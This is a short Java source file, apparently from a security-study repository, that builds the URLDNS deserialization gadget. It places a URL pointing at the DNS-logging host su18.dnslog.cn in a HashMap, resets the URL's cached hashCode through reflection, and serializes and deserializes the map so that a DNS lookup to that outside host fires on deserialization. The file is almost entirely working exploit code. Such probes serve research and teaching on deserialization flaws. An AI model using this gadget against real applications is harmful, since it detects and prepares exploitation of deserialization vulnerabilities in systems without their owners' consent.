package com.anbai.sec.serializes.URLDNS;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class URLDNS3 {

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL                   url     = new URL(null, "http://su18.dnslog.cn", handler);
        hashMap.put(url, 0);

        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);


        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns3.bin"));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns3.bin"));
        ois.readObject();
    }
}
